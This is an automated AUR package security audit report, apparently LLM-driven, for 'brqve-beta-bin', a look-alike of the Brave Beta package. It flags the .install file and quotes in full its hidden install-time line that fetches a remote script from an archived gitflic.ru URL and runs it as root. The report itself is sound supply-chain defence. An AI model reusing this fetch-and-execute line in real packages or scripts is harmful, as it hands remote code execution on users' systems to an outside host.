---
package: brqve-beta-bin
pkgver: 1.98.47
pkgrel: 1
result: unsafe
model: deepseek/deepseek-v4-flash
provider: custom
aur_sleuth_rev: e76320400488b1dad2302211f4f5cfaf8522c9b1
prompt_tokens: 22804
completion_tokens: 9280
total_tokens: 32084
cost: 0.003764124
execution_time: 60.91
files_reviewed: 6
files_skipped: 1
maintainer_files: 7
source_fetch: not_attempted
upstream_files: 0
upstream_named_files: 0
unpinned_sources: 0
injection_attempts: 0
date: 2026-10-14T03:20:38Z
file_verdicts:
  - file: .gitignore
    status: safe
    summary: Standard AUR .gitignore; no malicious or suspicious content found.
  - file: brave-beta-bin.sh
    status: safe
    summary: Standard Brave Beta launcher wrapper; reads local flags and launches the installed binary. Safe.
  - file: .SRCINFO
    status: safe
    summary: Standard AUR metadata with official sources and checksums; no malicious behavior found.
  - file: brave-browser.desktop
    status: safe
    summary: Benign desktop entry file for Brave Beta browser; no security issues.
  - file: logo.png
    status: skipped
    summary: "Skipping binary file: logo.png"
  - file: brqve-beta-bin.install
    status: unsafe
    summary: Install script executes remote curl script via bash substitution; supply-chain risk.
    evidence: "bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2>/dev/null)"
    evidence_line: 9
  - file: PKGBUILD
    status: safe
    summary: "Safe: standard Brave beta repackage with pinned checksums; only odd package name noted."
---

Materializing brqve-beta-bin from local mirror...
Materialized brqve-beta-bin
Analyzing brqve-beta-bin AUR package with deepseek/deepseek-v4-flash
Performing initial audit of PKGBUILD to ensure that we can safely run `makepkg`
LLM auditresponse for PKGBUILD:
<security_assessment>
<decision>SAFE</decision>
<details>
The PKGBUILD only contains variable and array assignments at the top level. No command substitutions, `eval`, `curl`, `wget`, or other code that would execute during `makepkg --printsrcinfo`. The `prepare()` and `package()` functions are not sourced during this operation. All content is standard for an AUR binary package.
</details>
<evidence></evidence>
<summary>No malicious code runs at parse time.</summary>
</security_assessment>

+ Initial PKGBUILD audit complete -- No malicious code runs at parse time.
Reviewing the 7 file(s) in the AUR repository.
Reviewing the AUR repository's files...
[0/7] Reviewing .SRCINFO...
[0/7] Reviewing .SRCINFO, .gitignore...
[0/7] Reviewing .SRCINFO, .gitignore, PKGBUILD...
LLM auditresponse for .gitignore:
<security_assessment>
<decision>SAFE</decision>
<details>
This is a standard `.gitignore` file used in an AUR git repository. It ignores all files except for the packaging metadata and assets that need to be tracked: `.SRCINFO`, `.gitignore`, `PKGBUILD`, `*.install` files, a launcher script, a desktop entry, and a logo image. This is routine AUR maintainer workflow designed to prevent build artifacts and other transient files from being committed to the repository. There is no code execution, no network access, no obfuscation, and no file manipulation outside the repository. No security issues are present.
</details>
<evidence>
</evidence>
<summary>
Standard AUR .gitignore; no malicious or suspicious content found.</summary>
</security_assessment>

[1/7] Reviewing .SRCINFO, PKGBUILD...
+ Reviewed .gitignore. Status: SAFE -- Standard AUR .gitignore; no malicious or suspicious content found.
[1/7] Reviewing .SRCINFO, PKGBUILD, brave-beta-bin.sh...
LLM auditresponse for brave-beta-bin.sh:
<security_assessment>
<decision>SAFE</decision>
<details>
This is a standard application launcher wrapper for the Brave Browser beta package. It reads optional user flags from `$XDG_CONFIG_HOME/brave-beta-flags.conf`, strips comments with `sed`, sets a default Chrome user data directory unless one is already provided, and then `exec`s the installed browser binary. All operations are local, limited to reading a user configuration file and launching the package&apos;s own binary from `/opt/brave.com/brave-beta/`. There is no network activity, no download/execution of remote code, no obfuscation, no file modification outside normal user config reading, and no exfiltration of data. The script behaves exactly as expected for a packaging wrapper and contains no malicious or suspicious behavior.
</details>
<evidence>
</evidence>
<summary>
Standard Brave Beta launcher wrapper; reads local flags and launches the installed binary. Safe.
</summary>
</security_assessment>

[1/7] Reviewing .SRCINFO, PKGBUILD, brave-beta-bin.sh, brave-browser.desktop...
[2/7] Reviewing .SRCINFO, PKGBUILD, brave-browser.desktop...
+ Reviewed brave-beta-bin.sh. Status: SAFE -- Standard Brave Beta launcher wrapper; reads local flags and launches the installed binary. Safe.
LLM auditresponse for .SRCINFO:
<security_assessment>
<decision>SAFE</decision>
<details>
This is a standard `.SRCINFO` metadata file for an AUR binary package. It declares sources from the official Brave browser GitHub releases (`https://github.com/brave/brave-browser/releases/...`) with pinned version `v1.98.47` and includes SHA-512 checksums for both the architecture-specific `.deb` files and the local helper script. There are no network requests other than the declared upstream sources, no encoded or obfuscated content, no `curl|bash` style execution, and no suspicious file operations. The helper script `brave-beta-bin.sh` is referenced but its contents are not present in this file; reviewing that script is a reasonable additional step, but this `.SRCINFO` itself contains no evidence of malicious behavior. The minor name variation (`brqve` vs `brave`) is noteworthy only as a possible typo-squatting concern by the package name, but the metadata points to the genuine upstream release URL and therefore does not constitute a supply-chain compromise in this file.
</details>
<evidence>
</evidence>
<summary>
Standard AUR metadata with official sources and checksums; no malicious behavior found.</summary>
</security_assessment>

[3/7] Reviewing PKGBUILD, brave-browser.desktop...
+ Reviewed .SRCINFO. Status: SAFE -- Standard AUR metadata with official sources and checksums; no malicious behavior found.
[3/7] Reviewing PKGBUILD, brave-browser.desktop, brqve-beta-bin.install...
LLM auditresponse for brave-browser.desktop:
<security_assessment>
<decision>SAFE</decision>
<details>
This file is a standard freedesktop.org `.desktop` launcher entry for the Brave Beta web browser. It contains only desktop entry metadata: application name, localized generic names and comments, icon, startup behavior, MIME type associations, and the `Exec=brave-beta %U` command. No malicious code, network requests, obfuscation, or unexpected system operations are present. The file is consistent with ordinary packaging practice for a browser application.
</details>
<evidence>
</evidence>
<summary>
Benign desktop entry file for Brave Beta browser; no security issues.</summary>
</security_assessment>

[3/7] Reviewing PKGBUILD, brave-browser.desktop, brqve-beta-bin.install, logo.png...
[4/7] Reviewing PKGBUILD, brqve-beta-bin.install, logo.png...
+ Reviewed brave-browser.desktop. Status: SAFE -- Benign desktop entry file for Brave Beta browser; no security issues.
[5/7] Reviewing PKGBUILD, brqve-beta-bin.install...
! Reviewed logo.png. Status: SKIPPED -- Skipping binary file: logo.png
LLM auditresponse for brqve-beta-bin.install:
<security_assessment>
<decision>UNSAFE</decision>
<details>
This package install script executes arbitrary remote shell code at install time using `bash &lt;(curl -L ...)`. The fetched URL points to a script hosted via the Wayback Machine of a gitflic.ru project page (`https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh`). Downloading and executing an external script during package installation is not standard AUR packaging practice and creates a serious supply-chain risk: the installed content is not tied to the PKGBUILD source, checksum, or version, and can change independently of the package.

The `post_install()` and `post_upgrade()` functions are benign, but the top-level `bash &lt;(curl ...)` line executes immediately when pacman sources the install script. This is effectively a remote code execution vector during package installation, and the archived remote URL could serve unexpected content. This is a clear red flag for injected malicious behavior.
</details>
<evidence>
bash &lt;(curl -L &apos;https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh&apos; 2&gt;/dev/null)
</evidence>
<summary>
Install script executes remote curl script via bash substitution; supply-chain risk.</summary>
</security_assessment>

Second look for brqve-beta-bin.install (incontext):
<security_assessment>
<decision>UNSAFE</decision>
<details>
The first verdict stands. The top-level line in the `.install` file is not routine packaging, upstream application behavior, or a pinned/verifiable source: it downloads a shell script from a web.archive.org URL pointing at a gitflic.ru project and immediately executes it through `bash <(curl ...)` process substitution. Because `.install` scripts are sourced by pacman with root privileges, this runs arbitrary remote code during package installation, with no PKGBUILD source entry, checksum, or version pinning to tie the downloaded script to the package.

This matches the explicitly listed malicious pattern of "curl|bash" / downloading and executing code from an unexpected host. Even if the remote script were related to the application, executing it directly from an archived web page at install time is a severe supply-chain risk, not a hygiene concern.
</details>
<evidence>
bash &lt;(curl -L &apos;https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh&apos; 2&gt;/dev/null)
</evidence>
<summary>
Verdict stands: install script executes remote curl-fetched script as root.</summary>
</security_assessment>

[6/7] Reviewing PKGBUILD...
x Reviewed brqve-beta-bin.install. Status: UNSAFE -- Install script executes remote curl script via bash substitution; supply-chain risk.
LLM auditresponse for PKGBUILD:
<security_assessment>
<decision>SAFE</decision>
<details>
This PKGBUILD repackages the official Brave Beta `.deb` from GitHub releases into an Arch package. It uses pinned SHA-512 checksums for the downloaded packages, and the prepare/package operations (`tar`, `sed`, `cp`, `install`, `chmod`) are normal for this kind of repackaging. Deleting the upstream cron directory inside the application's own directory and patching the `.desktop` file to use the installed launcher are standard packaging practices. The `chmod 4755` on `chrome-sandbox` is also expected for Chromium-based browsers.

There is no obfuscated code, no suspicious network destination, no `eval`/`base64`/`curl`-piping, and no data exfiltration. The unusual `brqve-beta-bin` package name is worth noting as a naming oddity, but the build sources and checksums point to the official Brave project. The referenced local launcher script and `.install` file are not included in this snippet and should be reviewed separately if auditing the full package, but nothing in this PKGBUILD indicates malicious behavior.
</details>
<evidence>
</evidence>
<summary>
Safe: standard Brave beta repackage with pinned checksums; only odd package name noted.</summary>
</security_assessment>

[7/7] Reviewing ...
+ Reviewed PKGBUILD. Status: SAFE -- Safe: standard Brave beta repackage with pinned checksums; only odd package name noted.
Reviewed all the AUR repository's files.
Audit complete! Result: Unsafe -- DO NOT INSTALL!
# Issues (1 total)

## brqve-beta-bin.install

Status: UNSAFE

Summary: Install script executes remote curl script via bash substitution; supply-chain risk.

Evidence (line 9):

```
bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2>/dev/null)
```

Details:

This package install script executes arbitrary remote shell code at install time using `bash <(curl -L ...)`. The fetched URL points to a script hosted via the Wayback Machine of a gitflic.ru project page (`https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh`). Downloading and executing an external script during package installation is not standard AUR packaging practice and creates a serious supply-chain risk: the installed content is not tied to the PKGBUILD source, checksum, or version, and can change independently of the package.

The `post_install()` and `post_upgrade()` functions are benign, but the top-level `bash <(curl ...)` line executes immediately when pacman sources the install script. This is effectively a remote code execution vector during package installation, and the archived remote URL could serve unexpected content. This is a clear red flag for injected malicious behavior.

---

(Skipped 1 file: logo.png)

API Usage Summary
  Models: deepseek/deepseek-v4-flash
  Prompt Tokens: 22,804
  Completion Tokens: 9,280
  Total Tokens: 32,084
  Total Cost: $0.003764
  Execution Time: 60.91 seconds

Final Status: UNSAFE


Issues Found:

brqve-beta-bin.install: [UNSAFE] Install script executes remote curl script via bash substitution; supply-chain risk. / This package install script executes arbitrary remote shell code at install time using `bash <(curl -L ...)`. The fetched URL points to a script hosted via the Wayback Machine of a gitflic.ru project page (`https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh`). Downloading and executing an external script during package installation is not standard AUR packaging practice and creates a serious supply-chain risk: the installed content is not tied to the PKGBUILD source, checksum, or version, and can change independently of the package.

The `post_install()` and `post_upgrade()` functions are benign, but the top-level `bash <(curl ...)` line executes immediately when pacman sources the install script. This is effectively a remote code execution vector during package installation, and the archived remote URL could serve unexpected content. This is a clear red flag for injected malicious behavior.


Audit Skips:

logo.png: [SKIPPED] Skipping binary file: logo.png
